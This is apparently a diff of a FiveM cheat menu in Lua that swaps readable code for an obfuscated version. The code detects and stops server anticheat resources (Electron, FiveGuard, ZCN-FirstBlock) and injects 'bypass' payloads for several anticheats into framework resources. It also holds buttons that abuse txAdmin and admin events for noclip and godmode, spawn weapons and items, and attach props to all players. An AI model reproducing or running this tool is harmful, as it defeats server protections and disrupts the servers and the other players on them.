-
-    return foundAnticheat, foundScriptName
-end
-
--- Electron Anticheat Scan Button
-MachoMenuButton(AntiCheatSection, "Scan Electron Anticheat", function()
-    CreateThread(function()
-        local foundAnticheat, foundScriptName = ScanElectronAnticheat()
-
-        Wait(100)
-
-        if foundAnticheat then
-            MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat System Found: " .. foundScriptName .. "")
-        else
-            MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Not Found!")
-            detectedElectronResource = "" -- Reset if not found
-            isElectronStopped = false
-        end
-    end)
-end)
-
--- FiveGuard Anticheat Scan Button
-MachoMenuButton(AntiCheatSection, "Scan FiveGuard", function()
-    CreateThread(function()
-        local foundAnticheat, foundScriptName = ScanFiveGuardAnticheat()
-
-        Wait(100)
-
-        if foundAnticheat then
-            MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat System Found: " .. foundScriptName .. "")
-        else
-            MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Not Found!")
-            detectedFiveGuardResource = "" -- Reset if not found
-            isFiveGuardStopped = false
-        end
-    end)
-end)
-
--- Electron Anticheat Stop/Start Button
-MachoMenuButton(AntiCheatSection, "Stop/Start Electron Anticheat", function()
-    CreateThread(function()
-        -- First scan
-        local foundAnticheat, foundScriptName = ScanElectronAnticheat()
-
-        Wait(100)
-
-        if foundAnticheat then
-            if not isElectronStopped then
-                -- Stop resource
-                MachoResourceStop(detectedElectronResource)
-                MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Stopped: " .. detectedElectronResource .. "")
-                isElectronStopped = true
-            else
-                -- Start resource
-                MachoResourceStart(detectedElectronResource)
-                MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Started: " .. detectedElectronResource .. "")
-                isElectronStopped = false
-            end
-        else
-            MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Not Found!")
-            detectedElectronResource = ""
-            isElectronStopped = false
-        end
-    end)
-end)
-
--- FiveGuard Anticheat Stop/Start Button
-MachoMenuButton(AntiCheatSection, "Stop/Start FiveGuard Anticheat", function()
-    CreateThread(function()
-        -- First scan
-        local foundAnticheat, foundScriptName = ScanFiveGuardAnticheat()
-
-        Wait(100)
-
-        if foundAnticheat then
-            if not isFiveGuardStopped then
-                -- Stop resource
-                MachoResourceStop(detectedFiveGuardResource)
-                MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Stopped: " .. detectedFiveGuardResource .. "")
-                isFiveGuardStopped = true
-            else
-                -- Start resource
-                MachoResourceStart(detectedFiveGuardResource)
-                MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Started: " .. detectedFiveGuardResource .. "")
-                isFiveGuardStopped = false
-            end
-        else
-            MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Not Found!")
-            detectedFiveGuardResource = ""
-            isFiveGuardStopped = false
-        end
-    end)
-end)
-
--- ZCN-FirstBlock Stop/Start Button
-local isZCNStopped = false
-local detectedZCNResource = ""
-
-local function ScanZCNResource()
-    for i = 0, GetNumResources() - 1 do
-        local resourceName = GetResourceByFindIndex(i)
-        if string.lower(resourceName) == "zcn-firstblock" then
-            detectedZCNResource = resourceName
-            return true
-        end
-    end
-    return false
-end
-
-local function StartAutoStopThread(resourceName)
-    CreateThread(function()
-        while isZCNStopped do
-            Wait(60000) -- Wait 60 seconds
-            if MachoResourceState(resourceName) == "started" then
-                MachoResourceStop(resourceName)
-                print("[ZCN] Resource was restarted, stopped again.")
-                MachoMenuNotification("[ZCN Control]", "ZCN-FirstBlock restarted, stopped again.")
-            end
-        end
-    end)
-end
-
-MachoMenuButton(AntiCheatSection, "Stop/Start ZCN-FirstBlock", function()
-    CreateThread(function()
-        local foundZCN = ScanZCNResource()
-        Wait(100)
-
-        if foundZCN then
-            if not isZCNStopped then
-                -- Stop script
-                MachoResourceStop(detectedZCNResource)
-                MachoMenuNotification("[ZCN Control]", "ZCN-FirstBlock Stopped: " .. detectedZCNResource)
-                isZCNStopped = true
-
-                -- Start auto-control thread
-                StartAutoStopThread(detectedZCNResource)
-            else
-                -- Start script
-                MachoResourceStart(detectedZCNResource)
-                MachoMenuNotification("[ZCN Control]", "ZCN-FirstBlock Started: " .. detectedZCNResource)
-                isZCNStopped = false
-            end
-        else
-            MachoMenuNotification("[ZCN Control]", "'ZCN-FirstBlock' Script Not Found on Server!")
-            detectedZCNResource = ""
-            isZCNStopped = false
-        end
-    end)
-end)
-
--- WX AntiCheat Bypass (Full - Fixed)
-MachoMenuButton(AntiCheatSection, "WX AntiCheat Bypass", function()
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    elseif GetResourceState('es_extended') == "started" then
-        targetResource = 'es_extended'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+        ]],v403));MachoMenuNotification("ERP System","Mouth animation applied for ID "   .. v403   .. " and your character is also animated!" );v150=true;else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end if (v402==(144 -(102 + 42))) then if v150 then local v843=1844 -(1524 + 320) ;while true do if (v843==0) then MachoInjectResource("monitor",[[
+            local playerPed = PlayerPedId()
+            ClearPedTasks(playerPed)
+            DetachEntity(playerPed, true, true)
+            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
+        ]]);MachoMenuNotification("ERP System","Animation stopped!");v843=1;end if (1==v843) then v150=false;return;end end end v403=MachoMenuGetInputbox(v149);v402=1271 -(1049 + 221) ;end end end);local v151=MachoMenuAddTab(v4,"Anticheat Check");local v152=166 -(18 + 138) ;local v153=12 -7 ;local v154=MachoMenuGroup(v151,"Anticheat Checker",v3,v152,(v1.x-v3) + (1252 -(67 + 1035)) ,v1.y);local v155="";local v156=false;local v157="";local v158=false;local function v159() local v404=348 -(136 + 212) ;local v405;local v406;local v407;while true do if (v404==1) then v407=GetNumResources();for v790=0,v407-(4 -3)  do local v791=GetResourceByFindIndex(v790);local v792=LoadResourceFile(v791,"fxmanifest.lua");if v792 then if (string.find(v792,"https://electron-services.com") or string.find(v792,"Electron Services") or string.find(v792,"The most advanced fiveM anticheat")) then v405=true;v406=v791;v155=v791;break;end end end v404=2 + 0 ;end if (v404==(0 + 0)) then v405=false;v406="";v404=1;end if ((1606 -(240 + 1364))==v404) then return v405,v406;end end end local function v160() local v408=1082 -(1050 + 32) ;local v409;local v410;local v411;while true do if (v408==0) then v409=false;v410="";v408=3 -2 ;end if (v408==(2 + 0)) then return v409,v410;end if (1==v408) then v411=GetNumResources();for v793=0,v411-1  do local v794=GetResourceByFindIndex(v793);local v795=GetNumResourceMetadata(v794,"client_script");for v844=1055 -(331 + 724) ,v795-(1 + 0)  do local v845=GetResourceMetadata(v794,"client_script",v844);if (v845~=nil) then if string.find(v845,"obfuscated") then v409=true;v410=v794;v157=v794;break;end end end if v409 then break;end end v408=646 -(269 + 375) ;end end end MachoMenuButton(v154,"Scan Electron Anticheat",function() CreateThread(function() local v502=725 -(267 + 458) ;local v503;local v504;while true do if (v502==(0 + 0)) then v503,v504=v159();Wait(192 -92 );v502=819 -(667 + 151) ;end if (v502==1) then if v503 then MachoMenuNotification("[Anticheat Checker]","Electron Anticheat System Found: "   .. v504   .. "" );else MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Not Found!");v155="";v156=false;end break;end end end);end);MachoMenuButton(v154,"Scan FiveGuard",function() CreateThread(function() local v505,v506=v160();Wait(1597 -(1410 + 87) );if v505 then MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat System Found: "   .. v506   .. "" );else MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Not Found!");v157="";v158=false;end end);end);MachoMenuButton(v154,"Stop/Start Electron Anticheat",function() CreateThread(function() local v507=1897 -(1504 + 393) ;local v508;local v509;while true do if (v507==0) then v508,v509=v159();Wait(100);v507=2 -1 ;end if (v507==(2 -1)) then if v508 then if  not v156 then local v940=0;while true do if (v940==(796 -(461 + 335))) then MachoResourceStop(v155);MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Stopped: "   .. v155   .. "" );v940=1 + 0 ;end if (v940==1) then v156=true;break;end end else MachoResourceStart(v155);MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Started: "   .. v155   .. "" );v156=false;end else local v884=0;while true do if (v884==1) then v156=false;break;end if (v884==0) then MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Not Found!");v155="";v884=1;end end end break;end end end);end);MachoMenuButton(v154,"Stop/Start FiveGuard Anticheat",function() CreateThread(function() local v510=1761 -(1730 + 31) ;local v511;local v512;while true do if ((1668 -(728 + 939))==v510) then if v511 then if  not v158 then MachoResourceStop(v157);MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Stopped: "   .. v157   .. "" );v158=true;else local v941=0;while true do if ((3 -2)==v941) then v158=false;break;end if (v941==(0 -0)) then MachoResourceStart(v157);MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Started: "   .. v157   .. "" );v941=1;end end end else MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Not Found!");v157="";v158=false;end break;end if (v510==(0 -0)) then v511,v512=v160();Wait(1168 -(138 + 930) );v510=1 + 0 ;end end end);end);local v161=false;local v162="";local function v163() local v412=0 + 0 ;while true do if (v412==0) then for v796=0,GetNumResources() -(1 + 0)  do local v797=GetResourceByFindIndex(v796);if (string.lower(v797)=="zcn-firstblock") then v162=v797;return true;end end return false;end end end local function v164(v413) CreateThread(function() while v161 do local v584=0 -0 ;while true do if (v584==(1766 -(459 + 1307))) then Wait(60000);if (MachoResourceState(v413)=="started") then MachoResourceStop(v413);print("[ZCN] Resource was restarted, stopped again.");MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock restarted, stopped again.");end break;end end end end);end MachoMenuButton(v154,"Stop/Start ZCN-FirstBlock",function() CreateThread(function() local v513=v163();Wait(1970 -(474 + 1396) );if v513 then if  not v161 then MachoResourceStop(v162);MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock Stopped: "   .. v162 );v161=true;v164(v162);else MachoResourceStart(v162);MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock Started: "   .. v162 );v161=false;end else local v722=0;while true do if (v722==(1 -0)) then v161=false;break;end if (0==v722) then MachoMenuNotification("[ZCN Control]","'ZCN-FirstBlock' Script Not Found on Server!");v162="";v722=1 + 0 ;end end end end);end);MachoMenuButton(v154,"WX AntiCheat Bypass",function() local v414=0;local v415;while true do if (1==v414) then MachoInjectResource2(NewThreadNs,v415,[[
         -- ============================================================
         -- WX ANTICHEAT BYPASS V3 - COMPLETE
         -- ============================================================
@@ -6545,27 +2957,7 @@ MachoMenuButton(AntiCheatSection, "WX AntiCheat Bypass", function()
                 print('[WX Bypass] Protection active')
             end
         end)
-    ]])
-    
-    MachoMenuNotification("WX Bypass", "WX AntiCheat bypass activated!")
-    print("[WX Bypass] Activated")
-end)
-
--- Electron AC (Anti-Cheat Bypass) - Added to AntiCheatSection
-MachoMenuButton(AntiCheatSection, "Electron AC Bypass", function()
-    -- Inject the Electron AC bypass into a resource
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    elseif GetResourceState('es_extended') == "started" then
-        targetResource = 'es_extended'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+    ]]);MachoMenuNotification("WX Bypass","WX AntiCheat bypass activated!");v414=2;end if (v414==0) then v415=nil;if (GetResourceState("monitor")=="started") then v415="monitor";elseif (GetResourceState("qb-core")=="started") then v415="qb-core";elseif (GetResourceState("es_extended")=="started") then v415="es_extended";else v415="ox_inventory";end v414=1 + 0 ;end if ((5 -3)==v414) then print("[WX Bypass] Activated");break;end end end);MachoMenuButton(v154,"Electron AC Bypass",function() local v416=nil;if (GetResourceState("monitor")=="started") then v416="monitor";elseif (GetResourceState("qb-core")=="started") then v416="qb-core";elseif (GetResourceState("es_extended")=="started") then v416="es_extended";else v416="ox_inventory";end MachoInjectResource2(NewThreadNs,v416,[[
         -- Electron AC Bypass
         print("Electron AC: Bypass activated")
         
@@ -6755,28 +3147,7 @@ MachoMenuButton(AntiCheatSection, "Electron AC Bypass", function()
         
         print("Electron AC: Bypass active")
         TriggerEvent('chat:addMessage', { args = { '^2Electron AC:', 'Bypass activated successfully!' } })
-    ]])
-    
-    MachoMenuNotification("Electron AC", "Electron AC bypass activated!")
-    print("[Electron AC] Bypass activated")
-end)
-
--- ============================================================
--- BYPASS OPTIONS (Added to AntiCheatSection)
--- ============================================================
-
--- FiveGuard Bypass
-MachoMenuButton(AntiCheatSection, "FiveGuard Bypass", function()
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+    ]]);MachoMenuNotification("Electron AC","Electron AC bypass activated!");print("[Electron AC] Bypass activated");end);MachoMenuButton(v154,"FiveGuard Bypass",function() local v417=nil;if (GetResourceState("monitor")=="started") then v417="monitor";elseif (GetResourceState("qb-core")=="started") then v417="qb-core";else v417="ox_inventory";end MachoInjectResource2(NewThreadNs,v417,[[
         print("FiveGuard Bypass: Activating...")
         
         -- Stop FiveGuard resources
@@ -6824,23 +3195,7 @@ MachoMenuButton(AntiCheatSection, "FiveGuard Bypass", function()
         
         print("FiveGuard Bypass: Active")
         TriggerEvent('chat:addMessage', { args = { '^2FiveGuard Bypass:', 'Activated successfully!' } })
-    ]])
-    
-    MachoMenuNotification("FiveGuard", "FiveGuard bypass activated!")
-end)
-
--- Eagle AC Bypass
-MachoMenuButton(AntiCheatSection, "Eagle AC Bypass", function()
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+    ]]);MachoMenuNotification("FiveGuard","FiveGuard bypass activated!");end);MachoMenuButton(v154,"Eagle AC Bypass",function() local v418=0;local v419;while true do if (v418==(0 + 0)) then v419=nil;if (GetResourceState("monitor")=="started") then v419="monitor";elseif (GetResourceState("qb-core")=="started") then v419="qb-core";else v419="ox_inventory";end v418=1;end if (v418==1) then MachoInjectResource2(NewThreadNs,v419,[[
         print("Eagle AC Bypass: Activating...")
         
         -- Stop Eagle AC resources
@@ -6890,23 +3245,7 @@ MachoMenuButton(AntiCheatSection, "Eagle AC Bypass", function()
         
         print("Eagle AC Bypass: Active")
         TriggerEvent('chat:addMessage', { args = { '^2Eagle AC Bypass:', 'Activated successfully!' } })
-    ]])
-    
-    MachoMenuNotification("Eagle AC", "Eagle AC bypass activated!")
-end)
-
--- ReaperV4 Bypass
-MachoMenuButton(AntiCheatSection, "ReaperV4 Bypass", function()
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+    ]]);MachoMenuNotification("Eagle AC","Eagle AC bypass activated!");break;end end end);MachoMenuButton(v154,"ReaperV4 Bypass",function() local v420=0 -0 ;local v421;while true do if (v420==(4 -3)) then MachoInjectResource2(NewThreadNs,v421,[[
         print("ReaperV4 Bypass: Activating...")
         
         -- Stop Reaper resources
@@ -6949,23 +3288,7 @@ MachoMenuButton(AntiCheatSection, "ReaperV4 Bypass", function()
         
         print("ReaperV4 Bypass: Active")
         TriggerEvent('chat:addMessage', { args = { '^2ReaperV4 Bypass:', 'Activated successfully!' } })
-    ]])
-    
-    MachoMenuNotification("ReaperV4", "ReaperV4 bypass activated!")
-end)
-
--- Stop All Anticheat Resources
-MachoMenuButton(AntiCheatSection, "Stop All Anticheat Resources", function()
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+    ]]);MachoMenuNotification("ReaperV4","ReaperV4 bypass activated!");break;end if ((591 -(562 + 29))==v420) then v421=nil;if (GetResourceState("monitor")=="started") then v421="monitor";elseif (GetResourceState("qb-core")=="started") then v421="qb-core";else v421="ox_inventory";end v420=1 + 0 ;end end end);MachoMenuButton(v154,"Stop All Anticheat Resources",function() local v422=1419 -(374 + 1045) ;local v423;while true do if (v422==(0 + 0)) then v423=nil;if (GetResourceState("monitor")=="started") then v423="monitor";elseif (GetResourceState("qb-core")=="started") then v423="qb-core";else v423="ox_inventory";end v422=2 -1 ;end if ((639 -(448 + 190))==v422) then MachoInjectResource2(NewThreadNs,v423,[[
         print("Stopping all anticheat resources...")
         
         local antiCheatResources = {
@@ -7000,41 +3323,7 @@ MachoMenuButton(AntiCheatSection, "Stop All Anticheat Resources", function()
         
         print("Stopped " .. stopped .. " anticheat resources")
         TriggerEvent('chat:addMessage', { args = { '^2Anticheat Killer:', 'Stopped ' .. stopped .. ' anticheat resources!' } })
-    ]])
-    
-    MachoMenuNotification("Anticheat Killer", "Stopping all anticheat resources...")
-end)
-
--- ============================================================
--- EAGLE AC SPAWN PROPS (Added to AntiCheatSection)
--- ============================================================
-
-local eaglePropsActive = false
-local eaglePropsThread = nil
-local eagleAttachedProps = {}
-
--- Function to stop Eagle Props
-local function StopEagleProps()
-    eaglePropsActive = false
-    eaglePropsThread = nil
-    
-    -- Clean up all attached objects
-    for _, obj in ipairs(eagleAttachedProps) do
-        if DoesEntityExist(obj) then
-            DeleteEntity(obj)
-        end
-    end
-    eagleAttachedProps = {}
-    
-    MachoMenuNotification("Eagle Props", "Stopped all prop spawns!")
-    print("[Eagle Props] Stopped and cleaned up all objects")
-end
-
--- Function to start Eagle Props
-local function StartEagleProps()
-    eaglePropsActive = true
-    
-    MachoInjectResource2(NewThreadNs, "monitor", [[
+    ]]);MachoMenuNotification("Anticheat Killer","Stopping all anticheat resources...");break;end end end);local v165=false;local v166=nil;local v167={};local function v168() v165=false;v166=nil;for v514,v515 in ipairs(v167) do if DoesEntityExist(v515) then DeleteEntity(v515);end end v167={};MachoMenuNotification("Eagle Props","Stopped all prop spawns!");print("[Eagle Props] Stopped and cleaned up all objects");end local function v169() local v424=0 + 0 ;while true do if (v424==1) then MachoMenuNotification("Eagle Props","Prop spawn started on all players!");print("[Eagle Props] Started");break;end if (v424==0) then v165=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         eaglePropsActive = true
         local attachedProps = {}
         local players = GetActivePlayers()
@@ -7120,70 +3409,7 @@ local function StartEagleProps()
         end
         
         print("[Eagle Props] All objects attached. They will auto-cleanup when stopped.")
-    ]])
-    
-    MachoMenuNotification("Eagle Props", "Prop spawn started on all players!")
-    print("[Eagle Props] Started")
-end
-
--- Eagle Props Toggle Button
-MachoMenuButton(AntiCheatSection, "Toggle Eagle Props", function()
-    if eaglePropsActive then
-        -- Stop
-        StopEagleProps()
-    else
-        -- Start
-        StartEagleProps()
-    end
-end)
-
--- Stop Eagle Props Button (Separate)
-MachoMenuButton(AntiCheatSection, "Stop Eagle Props", function()
-    StopEagleProps()
-end)
-
--- Status Check
-MachoMenuButton(AntiCheatSection, "Eagle Props Status", function()
-    if eaglePropsActive then
-        local count = #eagleAttachedProps
-        MachoMenuNotification("Eagle Props", "Active! " .. count .. " objects attached")
-        print("[Eagle Props] Active - " .. count .. " objects attached")
-    else
-        MachoMenuNotification("Eagle Props", "Inactive")
-        print("[Eagle Props] Inactive")
-    end
-end)
-
-print("[Eagle Props] Toggle added to AntiCheatSection!")
-
--- Toggle Admin Names
-MachoMenuButton(SecondSection, "Toggle Admin Names", function()
-    TriggerEvent('qb-admin:client:toggleNames')
-    MachoMenuNotification("Admin", "Toggling admin names...")
-end)
-
--- Toggle Admin Blips
-MachoMenuButton(SecondSection, "Toggle Admin Blips", function()
-    TriggerEvent('qb-admin:client:toggleBlips')
-    MachoMenuNotification("Admin", "Toggling admin blips...")
-end)
-
--- TX Features Section
--- ============================================================
--- TX NOCLIP WITH INDIVIDUAL BIND KEYS (F2, F5, F7)
--- ============================================================
-
-local txNoclipActive = false
-local txNoclipBindF2 = false
-local txNoclipBindF5 = false
-local txNoclipBindF7 = false
-
--- Function to toggle TX Noclip
-local function ToggleTxNoclip()
-    txNoclipActive = not txNoclipActive
-    
-    if txNoclipActive then
-        MachoInjectResource("monitor", [[
+    ]]);v424=1 + 0 ;end end end MachoMenuButton(v154,"Toggle Eagle Props",function() if v165 then v168();else v169();end end);MachoMenuButton(v154,"Stop Eagle Props",function() v168();end);MachoMenuButton(v154,"Eagle Props Status",function() if v165 then local v585=0 + 0 ;local v586;while true do if ((3 -2)==v585) then print("[Eagle Props] Active - "   .. v586   .. " objects attached" );break;end if (v585==0) then v586= #v167;MachoMenuNotification("Eagle Props","Active! "   .. v586   .. " objects attached" );v585=2 -1 ;end end else MachoMenuNotification("Eagle Props","Inactive");print("[Eagle Props] Inactive");end end);print("[Eagle Props] Toggle added to AntiCheatSection!");MachoMenuButton(v10,"Toggle Admin Names",function() local v425=1494 -(1307 + 187) ;while true do if ((0 -0)==v425) then TriggerEvent("qb-admin:client:toggleNames");MachoMenuNotification("Admin","Toggling admin names...");break;end end end);MachoMenuButton(v10,"Toggle Admin Blips",function() TriggerEvent("qb-admin:client:toggleBlips");MachoMenuNotification("Admin","Toggling admin blips...");end);local v16=false;local v170=false;local v171=false;local v172=false;local function v173() local v426=0 -0 ;while true do if (v426==0) then v16= not v16;if v16 then MachoInjectResource("monitor",[[
             local playerPed = PlayerPedId()
             
             -- Sound effect
@@ -7219,253 +3445,11 @@ local function ToggleTxNoclip()
                 
                 RemoveNamedPtfxAsset("core")
             end)
-        ]])
-        
-        TriggerEvent('txcl:setPlayerMode', 'noclip')
-        MachoMenuNotification("TX System", "Noclip active! Electricity effect added!")
-    else
-        TriggerEvent('txcl:setPlayerMode', 'none')
-        MachoMenuNotification("TX System", "Noclip deactivated!")
-    end
-end
-
--- Original Tx Noclip Checkbox
-MachoMenuCheckbox(SecondSection, "Tx Noclip - Safe", function()
-    ToggleTxNoclip()
-end, function()
-    if txNoclipActive then
-        ToggleTxNoclip()
-    end
-end)
-
--- ============================================================
--- INDIVIDUAL KEY BIND OPTIONS
--- ============================================================
-
-MachoMenuText(SecondSection, "TX NOCLIP BIND KEYS")
-
--- F2 Bind Toggle
-MachoMenuCheckbox(SecondSection, "Enable F2 Key", function()
-    txNoclipBindF2 = true
-    MachoMenuNotification("TX Bind", "F2 key enabled for TX Noclip")
-    print("[TX Bind] F2 key enabled for TX Noclip")
-end, function()
-    txNoclipBindF2 = false
-    MachoMenuNotification("TX Bind", "F2 key disabled for TX Noclip")
-    print("[TX Bind] F2 key disabled for TX Noclip")
-end)
-
--- F5 Bind Toggle
-MachoMenuCheckbox(SecondSection, "Enable F5 Key", function()
-    txNoclipBindF5 = true
-    MachoMenuNotification("TX Bind", "F5 key enabled for TX Noclip")
-    print("[TX Bind] F5 key enabled for TX Noclip")
-end, function()
-    txNoclipBindF5 = false
-    MachoMenuNotification("TX Bind", "F5 key disabled for TX Noclip")
-    print("[TX Bind] F5 key disabled for TX Noclip")
-end)
-
--- F7 Bind Toggle
-MachoMenuCheckbox(SecondSection, "Enable F7 Key", function()
-    txNoclipBindF7 = true
-    MachoMenuNotification("TX Bind", "F7 key enabled for TX Noclip")
-    print("[TX Bind] F7 key enabled for TX Noclip")
-end, function()
-    txNoclipBindF7 = false
-    MachoMenuNotification("TX Bind", "F7 key disabled for TX Noclip")
-    print("[TX Bind] F7 key disabled for TX Noclip")
-end)
-
--- ============================================================
--- BIND KEY DETECTION
--- ============================================================
-
-MachoOnKeyDown(function(vk)
-    -- F2 key (113) - only if enabled
-    if txNoclipBindF2 and vk == 113 then
-        ToggleTxNoclip()
-        MachoMenuNotification("TX Bind", "TX Noclip toggled via F2")
-        print("[TX Bind] TX Noclip toggled via F2")
-    end
-    
-    -- F5 key (116) - only if enabled
-    if txNoclipBindF5 and vk == 116 then
-        ToggleTxNoclip()
-        MachoMenuNotification("TX Bind", "TX Noclip toggled via F5")
-        print("[TX Bind] TX Noclip toggled via F5")
-    end
-    
-    -- F7 key (118) - only if enabled
-    if txNoclipBindF7 and vk == 118 then
-        ToggleTxNoclip()
-        MachoMenuNotification("TX Bind", "TX Noclip toggled via F7")
-        print("[TX Bind] TX Noclip toggled via F7")
-    end
-end)
-
--- ============================================================
--- STATUS DISPLAY
--- ============================================================
-
-MachoMenuButton(SecondSection, "TX Bind Status", function()
-    local status = "F2: " .. (txNoclipBindF2 and "ON" or "OFF") ..
-                  " | F5: " .. (txNoclipBindF5 and "ON" or "OFF") ..
-                  " | F7: " .. (txNoclipBindF7 and "ON" or "OFF")
-    MachoMenuNotification("TX Bind Status", status)
-    print("[TX Bind] Status: " .. status)
-end)
-
--- Enable All Keys Button
-MachoMenuButton(SecondSection, "Enable All TX Binds", function()
-    txNoclipBindF2 = true
-    txNoclipBindF5 = true
-    txNoclipBindF7 = true
-    MachoMenuNotification("TX Bind", "All keys enabled! F2, F5, F7")
-    print("[TX Bind] All keys enabled!")
-end)
-
--- Disable All Keys Button
-MachoMenuButton(SecondSection, "Disable All TX Binds", function()
-    txNoclipBindF2 = false
-    txNoclipBindF5 = false
-    txNoclipBindF7 = false
-    MachoMenuNotification("TX Bind", "All keys disabled!")
-    print("[TX Bind] All keys disabled!")
-end)
-
-print("[TX Bind] Individual bind system loaded (F2, F5, F7)")
-
-MachoMenuCheckbox(SecondSection, "Tx Godmode - Safe", function()
-    txGodmodeActive = true
-    TriggerEvent('txcl:setPlayerMode', 'godmode')
-    MachoMenuNotification("TX Features", "Godmode active!")
-end, function()
-    txGodmodeActive = false
-    TriggerEvent('txcl:setPlayerMode', 'none')
-    MachoMenuNotification("TX Features", "Godmode deactivated!")
-end)
-
-MachoMenuCheckbox(SecondSection, "Tx SuperJump - Safe", function()
-    txSuperJumpActive = true
-    TriggerEvent('txcl:setPlayerMode', 'superjump')
-    MachoMenuNotification("TX Features", "SuperJump active!")
-end, function()
-    txSuperJumpActive = false
-    TriggerEvent('txcl:setPlayerMode', 'none')
-    MachoMenuNotification("TX Features", "SuperJump deactivated!")
-end)
-
-MachoMenuButton(SecondSection, "TX TP Waypoint - Safe", function()
-    TriggerEvent("txcl:tpToWaypoint")
-end)
-
-MachoMenuButton(FirstSection, "Revive - Safe", function()
-    TriggerEvent('hospital:client:Revive', PlayerPedId())
-end)
-
-MachoMenuButton(SecondSection, "Tx Car Fix - Safe", function()
-    TriggerEvent('txcl:vehicle:fix')
-end)
-
-MachoMenuButton(SecondSection, "Tx Wild Attack - Risky", function()
-    TriggerEvent('txcl:wildAttack')
-end)
-
-MachoMenuButton(SecondSection, "Tx Car Boost - Risky", function()
-    TriggerEvent('txcl:vehicle:boost')
-end)
-
-MachoMenuText(FirstSection, "Weapon Spawn")
-
-MachoMenuButton(FirstSection, "RPG Spawn - Risky", function()
-    GiveWeaponToPed(PlayerPedId(), 'weapon_rpg', 250, false, true)
-end)
-
-MachoMenuButton(FirstSection, "Pistol Spawn - Safe", function()
-    GiveWeaponToPed(PlayerPedId(), 'weapon_pistol', 250, false, true)
-end)
-
-MachoMenuButton(FirstSection, "Glock 19 Spawn - Safe", function()
-    GiveWeaponToPed(PlayerPedId(), 'weapon_g19', 250, false, true)
-end)
-
-MachoMenuButton(FirstSection, "Remove Current Weapon", function()
-    RemoveWeaponFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()))
-end)
-
-Citizen.CreateThread(function()
-    -- Get server name and IP address
-    local serverName = GetConvar("sv_hostname", "N/A")
-    local serverIP = GetConvar("sv_endpoint", "N/A")
-    
-    -- If sv_hostname couldn't be retrieved, use GetCurrentServerEndpoint as alternative
-    if serverName == "N/A" then
-        serverName = GetCurrentServerEndpoint() or "Unknown Server"
-    end
-    
-    -- Server name check
-    if KeysBin == "wex" then
-        -- Wex Roleplay tab
-        local ThirdTab = MachoMenuAddTab(MenuWindow, "Wex Roleplay")
-        local ThirdSection = MachoMenuGroup(ThirdTab, "Wex Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        local InputBoxHandle = MachoMenuInputbox(ThirdSection, "Item to Spawn", "...")
-        MachoMenuButton(ThirdSection, "Spawn Item", function()
-            local LocatedText = { item = MachoMenuGetInputbox(InputBoxHandle), amount = 1 }
-
-            -- Check item name and amount
-            if LocatedText.item and LocatedText.item ~= "" then
-                -- Add item to server (correct format)
-                MachoInjectResource('m-Tequila', string.format([[
